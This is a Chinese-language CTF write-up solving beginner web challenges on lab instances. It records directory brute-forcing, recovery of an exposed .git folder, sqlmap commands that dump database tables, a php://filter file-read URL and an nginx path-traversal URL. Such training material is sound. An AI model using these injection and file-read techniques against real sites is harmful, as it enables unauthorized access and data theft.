# [第一章 web入门]常见的搜集
试了好些类似 dirsearch 的工具，都不好用，最后还是看的答案
- [dirsearch](https://github.com/maurosoria/dirsearch)：扫描网站目录
- [feroxbuster](https://github.com/epi052/feroxbuster)：扫描网站目录
- [ffuf](https://github.com/ffuf/ffuf)：扫描网站目录
- [gobuster](https://github.com/OJ/gobuster/releases/tag/v3.6.0)：扫描网站目录
- [common.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/common.txt): 常见目录文件名
反正最后就是要查出来几个文件
```
robots.txt -> flag1:n1book{info_1
index.php~ -> flag2:s_v3ry_im
.index.php.swp -> flag3:p0rtant_hack}

n1book{info_1s_v3ry_imp0rtant_hack}
```

# [第一章 web入门]粗心的小李
使用 GitHack 下载 .git 文件夹
```sh
'C:\Python27\python.exe' .\GitHack.py -u http://bd8453b7-fcb1-4725-8962-3bb1cb3dcef9.node5.buuoj.cn:81/.git
cd .\dist\bd8453b7-fcb1-4725-8962-3bb1cb3dcef9.node5.buuoj.cn_81\
git log
git show 213b7e386e9b0b406d91fae58bf8be11a58c3f88
```

# [第一章 web入门]SQL注入-1
使用 sqlmap
```sh
python .\sqlmap.py -u http://54313594-3a8c-4a9f-afdf-1c4c3a6d32a9.node5.buuoj.cn:81/index.php?id=1 --threads 10 -D note -T fl4g -C fllllag --dump
```

# [第一章 web入门]SQL注入-2
看提示抓包得到 payload: `sqlmap.txt`
```
POST /login.php HTTP/1.1
Host: 5bbca68c-c344-483c-b720-72fc1e93e32a.node5.buuoj.cn:81
Content-Length: 28
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Edg/135.0.0.0
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://5bbca68c-c344-483c-b720-72fc1e93e32a.node5.buuoj.cn:81
Referer: http://5bbca68c-c344-483c-b720-72fc1e93e32a.node5.buuoj.cn:81/login.php
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Connection: keep-alive

name=admin&pass=aaaaaaaaaaaa
```
使用 sqlmap 得到结果。
```sh
python .\sqlmap.py -r ..\..\assets\sqlmap.txt -D note -T fl4g -C flag --dump
```

# [第一章 web入门]afr_1
看答案说要用以下方法构造 url，不知道为啥：
```
http://c127db16-ec54-4b5a-a090-07204c94bcea.node5.buuoj.cn:81/?p=php://filter/read=convert.base64-encode/resource=flag
```
将返回的结果用 base64 解码：
```
PD9waHAKZGllKCdubyBubyBubycpOwovL24xYm9va3thZnJfMV9zb2x2ZWR9
```

# [第一章 web入门]afr_2
查看图片地址为
`http://1fcf9b71-f01a-43c6-9360-f067b8b26674.node5.buuoj.cn/img/img.gif`
然后答案说 nginx 没有在配置 static 文件夹的时候，忘记在最后面加上/，导致访问/static../的时候，会被替换为path/to/static/../，从而导致目录穿越漏洞。
所以这里可以尝试 `http://1fcf9b71-f01a-43c6-9360-f067b8b26674.node5.buuoj.cn/img../`
然后就能得到 flag 文件
